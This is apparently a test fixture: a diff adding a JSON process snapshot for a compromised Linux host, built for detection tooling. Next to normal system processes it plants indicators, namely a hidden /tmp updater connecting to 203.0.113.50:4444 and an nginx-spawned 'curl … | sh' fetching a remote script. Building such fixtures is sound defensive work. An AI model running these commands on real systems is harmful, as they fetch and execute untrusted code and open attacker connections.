@@ -1,0 +1,122 @@
+[
+  {
+    "cmdline": "/sbin/init",
+    "exe": "/usr/lib/systemd/systemd",
+    "kernel_thread": false,
+    "name": "systemd",
+    "pid": 1,
+    "ppid": 0,
+    "sha256": "57663872d9ca4a8af99a6c9940fe6a024cc36144c8d5d07de369b60898b2af18",
+    "start_time": "2025-10-10T06:00:00Z",
+    "state": "S",
+    "user": "root"
+  },
+  {
+    "cmdline": "/usr/sbin/sshd -D",
+    "exe": "/usr/sbin/sshd",
+    "kernel_thread": false,
+    "name": "sshd",
+    "pid": 800,
+    "ppid": 1,
+    "sha256": "8b91243a6ad698e5d58e80f982a04e2517191561514dd7683bc5807ce90fb057",
+    "start_time": "2025-10-10T06:00:00Z",
+    "state": "S",
+    "user": "root"
+  },
+  {
+    "cmdline": "/usr/sbin/cron -f",
+    "exe": "/usr/sbin/cron",
+    "kernel_thread": false,
+    "name": "cron",
+    "pid": 810,
+    "ppid": 1,
+    "sha256": "e8840f5c4a35bda7961f18a649f774136ab1abb6138f303a36255800f2a88296",
+    "start_time": "2025-10-10T06:00:00Z",
+    "state": "S",
+    "user": "root"
+  },
+  {
+    "cmdline": "nginx: master process /usr/sbin/nginx",
+    "exe": "/usr/sbin/nginx",
+    "kernel_thread": false,
+    "name": "nginx",
+    "pid": 900,
+    "ppid": 1,
+    "sha256": "b58a93fff1aed4ce4ca2abc73921eeb4ead5b8088c97f633ab5891c562aa6017",
+    "start_time": "2025-10-10T06:00:00Z",
+    "state": "S",
+    "user": "root"
+  },
+  {
+    "cmdline": "nginx: worker process",
+    "exe": "/usr/sbin/nginx",
+    "kernel_thread": false,
+    "name": "nginx",
+    "pid": 901,
+    "ppid": 900,
+    "sha256": "b58a93fff1aed4ce4ca2abc73921eeb4ead5b8088c97f633ab5891c562aa6017",
+    "start_time": "2025-10-10T06:00:00Z",
+    "state": "S",
+    "user": "www-data"
+  },
+  {
+    "cmdline": "-bash",
+    "exe": "/usr/bin/bash",
+    "kernel_thread": false,
+    "name": "bash",
+    "pid": 2000,
+    "ppid": 800,
+    "sha256": "f517a75067d4b3f9aebc0667f14558ae89956ec8d380d50ed32a43303aa5a2cc",
+    "start_time": "2025-10-10T06:00:00Z",
+    "state": "S",
+    "user": "alice"
+  },
+  {
+    "cmdline": "/tmp/.cache/updater --connect 203.0.113.50:4444 --token [REDACTED]",
+    "exe": "/tmp/.cache/updater",
+    "kernel_thread": false,
+    "name": "updater",
+    "pid": 4242,
+    "ppid": 1,
+    "sha256": "6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f",
+    "start_time": "2025-10-14T03:25:00Z",
+    "state": "S",
+    "user": "root"
+  },
+  {
+    "cmdline": "sh -c curl -s http://198.51.100.7/x.sh | sh",
+    "exe": "/usr/bin/dash",
+    "kernel_thread": false,
+    "name": "sh",
+    "pid": 5100,
+    "ppid": 901,
+    "sha256": "816f6bacc7bedf94400dc17cb8c62be05101ba463b78389ab74962e698eecded",
+    "start_time": "2025-10-14T08:55:00Z",
+    "state": "S",
+    "user": "www-data"
+  },
+  {
+    "cmdline": "/tmp/.mount_Cursor1xyz/AppRun --no-sandbox",
+    "exe": "/tmp/.mount_Cursor1xyz/AppRun",
+    "kernel_thread": false,
+    "name": "AppRun",
+    "pid": 3100,
+    "ppid": 2000,
+    "sha256": "2bd4a09978db40ab340b5f535eb8fe7d088236fd28d53881c7f0add5c60ffdec",
+    "start_time": "2025-10-14T08:00:00Z",
+    "state": "S",
+    "user": "alice"
+  },
+  {
+    "cmdline": "python3 -m http.server 8081",
+    "exe": "/usr/bin/python3",
+    "kernel_thread": false,
+    "name": "python3",
+    "pid": 4300,
+    "ppid": 2000,
+    "sha256": "f618cef6445c43b29cea6deb76689e3c52280cbd4081b7c711eef5960fff833b",
+    "start_time": "2025-10-14T08:30:00Z",
+    "state": "S",
+    "user": "alice"
+  }
+]
